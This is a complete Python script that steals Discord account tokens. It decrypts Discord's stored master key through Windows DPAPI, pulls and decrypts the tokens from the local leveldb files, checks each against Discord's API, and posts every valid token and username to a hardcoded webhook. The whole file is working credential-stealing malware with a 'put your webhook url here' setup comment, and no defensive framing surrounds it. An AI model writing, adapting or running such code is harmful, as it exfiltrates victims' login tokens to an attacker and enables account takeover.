import os
import json
import base64
import requests
import win32crypt
from Cryptodome.Cipher import AES
import re

WEBHOOK_URL = 'https://discord.com/api/webhooks/1401184533142831154/p-PMeOTbGTFfPi6D7inE3bBSjpG6x879NMYIejhnVn3XHdzVl2w_bxGHRTJEVUsL26Bm'  # put your webhook url here

appdata = os.getenv('APPDATA')
discord_path = appdata + '\\discord'
leveldb_path = discord_path + '\\Local Storage\\leveldb'
local_state_path = discord_path + '\\Local State'

with open(local_state_path, 'r', encoding='utf-8') as f:
    local_state = json.load(f)
encrypted_key = base64.b64decode(local_state['os_crypt']['encrypted_key'])[5:]
key = win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]

def decrypt_value(buff, key):
    try:
        iv = buff[3:15]
        payload = buff[15:]
        cipher = AES.new(key, AES.MODE_GCM, iv)
        return cipher.decrypt(payload)[:-16].decode()
    except:
        return None

token_regex = re.compile(r'dQw4w9WgXcQ:[^\"]*')

def get_user(token):
    r = requests.get('https://discord.com/api/v9/users/@me', headers={'Authorization': token})
    if r.status_code == 200:
        data = r.json()
        return f"{data['username']}#{data['discriminator']} ({data['id']})"
    return None

found = {}

for filename in os.listdir(leveldb_path):
    if not filename.endswith('.ldb') and not filename.endswith('.log'):
        continue
    with open(os.path.join(leveldb_path, filename), 'r', errors='ignore') as f:
        content = f.read()
        for encrypted in token_regex.findall(content):
            encrypted = encrypted.split('dQw4w9WgXcQ:')[1]
            decrypted = decrypt_value(base64.b64decode(encrypted), key)
            if decrypted and decrypted not in found:
                user = get_user(decrypted)
                if user:
                    found[decrypted] = user

if found:
    embed = {
        "title": "valid tokens found",
        "color": 0xFF0000,
        "fields": []
    }

    for token, user in found.items():
        embed["fields"].append({
            "name": user,
            "value": f"`{token}`",
            "inline": False
        })

    data = {
        "embeds": [embed]
    }

    r = requests.post(WEBHOOK_URL, json=data)
    if r.status_code == 204:
        print("sent tokens embed to webhook")
    else:
        print(f"failed to send webhook: {r.status_code} - {r.text}")
else:
    print("no valid tokens found")